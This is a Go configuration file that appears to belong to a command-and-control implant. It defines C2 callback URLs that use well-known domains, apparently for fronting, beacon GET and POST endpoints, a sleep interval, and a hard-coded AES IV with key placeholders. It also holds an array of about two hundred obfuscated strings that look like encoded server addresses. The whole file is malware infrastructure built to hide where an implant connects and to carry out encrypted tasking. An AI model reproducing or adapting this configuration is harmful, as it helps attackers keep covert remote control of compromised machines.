package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----`)
	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----`)

	C2        = "www.aliyun.com"
	C3        = "www.meituan.com"
	C4        = [200]string{"4IjMuUDNx4COy4SM", "wQjMuQTNx4SM34SM", "3MTMuYjNx4CNxIjLzgTM", "1MjMuIzMukTOuYzM", "=UTNx4yMuAjL3UTM", "yMjMuEjMx4yM2EjLwgTM", "=gDOx4CN1EjL3IjL3ETM", "5QjMuYDNx4CN5EjLxIjM", "zQjMuQTNx4SM34SM", "=QTMx4CO54COzEjLwUTM", "==gN3EjL0kjLyYjLxETM", "=MTOx4SMz4yMyEjL0QTM", "=MTMukzMy4SMxEjLzIjM", "xUjMuUDNx4COy4SM", "5AjMuUDNx4COy4SM", "=MjMy4yM1IjLzYjLxETM", "=IDNy4iN5EjL2UTMuYzM", "=gzMy4CN04CM2EjLxETM", "1ETMuQTNx4COzEjLzITM", "wAjMuUDNx4COy4SM", "=IDOucTNx4yN0EjL5EjM", "xQjMuQTNx4SM34SM", "0IjMuUDNx4COy4SM", "==QNuIDNuYjL1cTM", "3AjMuUDNx4COy4SM", "0EjMuETNx4iMzIjLzgTM", "xQjMuQzMy4SMxIjLxIjM", "2EjMuIDNy4SMwIjLzgTM", "=MzMy4SM4EjL2kjLzETM", "=MzMy4CM14yNuIDN", "yIjMuUDNx4COy4SM", "==AM1IjL5YjLyYjLxETM", "=QTOx4CMx4SN4EjLzAjM", "24SO04yMyEjLxETM", "wMjMuQTNx4SM34SM", "yQjMukTNx4iMzIjL0ITM", "==QMyEjL3EjMuMTOx4SM", "1IjMukDNx4CN3EjL3ETM", "==gM4EjL2ITMuYjLxETM", "1QjMugzNucTMuQTM", "yQjMuQTNx4SM34SM", "4MjMuQTNx4SM34SM", "=gzMy4SOxIjL5gTMuYzM", "4QjMuQTNx4SM34SM", "xEjMuUDNx4COy4SM", "zMjMuMTOukDOx4SM", "=UjNuAzMx4yM5EjLyITM", "=MjNuQDMy4SMzEjL3ETM", "zAjMukDOx4SNyIjL0ITM", "1ITMuUjL5EjLyETM", "yQjMuMTOukDOx4SM", "3MjMuMTOukDOx4SM", "5cTMuADMy4SM4EjLxIjM", "zQjMuMTOukDOx4SM", "xUTMuEDMy4SMzEjL3ETM", "zITMuUTOx4yM2EjL0ITM", "1MjMuQTNx4SM34SM", "yMjMuMTOukDOx4SM", "5MjMuUDNx4COy4SM", "wEjMuETNy4yN1EjLwETM", "xQjMuMTOukDOx4SM", "0MjMuMTOukDOx4SM", "=EDNy4CM1EjL2kjLzETM", "=kTOukTOukDOx4SM", "=QDMy4CMy4yMxIjLzgTM", "zATMukTOukDOx4SM", "2MjMuMTOukDOx4SM", "5MjMuMTOukDOx4SM", "wQjMuMTOukDOx4SM", "=YTOukTOukDOx4SM", "wATMukTOukDOx4SM", "ygTMuYzMy4iN2EjL0ITM", "yQjMuUjMy4yN1EjL3ETM", "3cTMuIDNuATOx4SM", "==gMwEjL4EjMuMTOx4SM", "=QTMx4iM44iM2EjL2ETM", "5AjMuITOx4CMyIjLwITM", "wMjMuMTOukDOx4SM", "=IDNy4SMugDOx4SM", "=AzNx4yN34yMzIjLwITM", "==QNyEjL3EjMuMTOx4SM", "1MjMucjMy4SOzIjL0ITM", "4MjMuMTOukDOx4SM", "xcjL4EjMuMTOx4SM", "0QjMuMTOukDOx4SM", "=gzNx4CO14SO0IjL5ETM", "xUjMuIDNuATOx4SM", "=MjMy4yMzEjLykjL4EjM", "=gzNx4SN0EjL1EjMugTN", "==wMzIjLyQjL5UjLzETM", "==wMxEjL3EjMuMTOx4SM", "=cDOx4yN3EjLwQjLxETM", "yIjLw4SM44SM", "=kDNy4CM2EjLwMjLyETM", "=czMy4SMugDOx4SM", "wETMuITOukTOx4SM", "=AzMy4SMugDOx4SM", "5gTMugjMx4CN3EjL3ETM", "=kDNy4SMy4yN4EjL3ETM", "3ATMuITOukTOx4SM", "==AOzIjL1IjMucDNukTN", "5cTMuIDNuATOx4SM", "=EzMy4SMugDOx4SM", "zQjMugTMy4CM0EjLygTM", "5QjMuUDNx4COy4SM", "=gzMy4SMugDOx4SM", "4QjMuYDNy4CM0EjLygTM", "wETMukTOukDOx4SM", "=EDNy4SMugDOx4SM", "0IjLw4SM44SM", "=MzMy4SMugDOx4SM", "wMjMuYTMy4CM0IjLzgTM", "3YjL4EjMuMTOx4SM", "1QjL1gjL2UjLxITM", "=kTMy4CM1IjL0QjLxETM", "=YzNx4iNwIjL3MjL1ITM", "xATMukTOukDOx4SM", "=kzMy4SMugDOx4SM", "2ATMuITOukTOx4SM", "==AOyIjL3EjLwcTMuYzM", "==AO4EjLyQTMukTOuYzM", "=ADNy4SMugDOx4SM", "2YjL4EjMuMTOx4SM", "xIjLw4SM44SM", "=ADNy4SM3EjLzQjLxETM", "zYTMuATMuYjLzITM", "0kjL4EjMuMTOx4SM", "4kTMuIDNuATOx4SM", "4QjMuYTNuIjMucjM", "zgTMuIDNuATOx4SM", "==QM1IjLxMjMuMjLzUTM", "=UDMx4iM34CN0EjLxEjM", "==QM5EjLxgjL2UTMuYzM", "3kjL4EjMuMTOx4SM", "=YjMy4CO3EjLwQjLxETM", "=kTMx4SN0IjL3kjLwgTM", "==ANxEjLyMjL2EjMugTN", "3UjL4EjMuMTOx4SM", "zIjLw4SM44SM", "4kjL4EjMuMTOx4SM", "ygjL4EjMuMTOx4SM", "5YTMuADOugTNugTN", "0ETMuITOukTOx4SM", "2kjL4EjMuMTOx4SM", "=QjMy4CO54iMzIjLwITM", "==QN3EjLx4SM44SM", "==AN3EjLx4SM44SM", "=YzMy4iM1IjL0QjLxETM", "=QzNx4CN34COyIjLyITM", "0ATMucDOuMjLxETM", "==gM0IjLwkjL0cjL1ITM", "=kzMy4SO3EjL2kjLzETM", "yUjMuIDNuATOx4SM", "1cjL4EjMuMTOx4SM", "==gMyIjLzMjLyIjL1cTM", "yQjMukTOukDOx4SM", "xgjL4EjMuMTOx4SM", "=ATOx4CO14SO0IjL5ETM", "4QTMuETNx4yN2EjL5ETM", "=gjMy4SN34yN0EjL5EjM", "=AzMy4yN1EjL3cjL1ITM", "=cjMy4iNx4CN2EjLxETM", "==AO3EjLx4SM44SM", "wIjMugTNuIjMucjM", "yQTMucjMx4COzEjLwUTM", "2IjMuIDNuATOx4SM", "==AN24SO3EjLwgjL0ETM", "zIjMukTOx4yMyEjL4ETM", "=QzMy4SMugDOx4SM", "==QM4EjLx4SM44SM", "==QO0IjLxQjMuYjL1cTM", "=QTOukDOuMjLxETM", "4gjL4EjMuMTOx4SM", "==QNxIjL1ATMucjLxETM", "ykTMuIDNuATOx4SM", "zMjMuEDMy4yN2EjL5ETM", "=cDMy4CNy4yNyIjLxATM", "=gDMx4yM2EjLxkjLxEjM", "=ITMx4iN54iN14SM", "==ANwIjLx4SM44SM", "=kDNy4iNx4CN2EjLxETM", "wQjMuYzMy4iMxIjL4ETM", "=gTOukTOukDOx4SM", "3ETMukTOukDOx4SM", "4QjMuIDNuATOx4SM", "=AjMx4iN54iN14SM", "4MTMuADNy4SO0IjLwQTM", "==gNxEjL4IjLwMTMuEjN", "=ETMx4iN54iN14SM", "xEjMuIDNuATOx4SM", "=QTMx4SN0IjL3kjLwgTM", "yEjMuIDNuATOx4SM", "=UDMx4iN54iN14SM", "=ITOx4iNx4CN2EjLxETM", "3cjL4EjMuMTOx4SM", "=YTMx4SN54SO5EjLwITM", "=kDOukTOukDOx4SM", "yETMuITOukTOx4SM", "3UjL2QjLyUTMuQTM", "zEjMuIDNuATOx4SM"}
	plainHTTP = "https://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/home"
	PostUrl   = plainHTTP + C2 + "/api/index"
	WaitTime  = 5000 * time.Millisecond

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = false
)
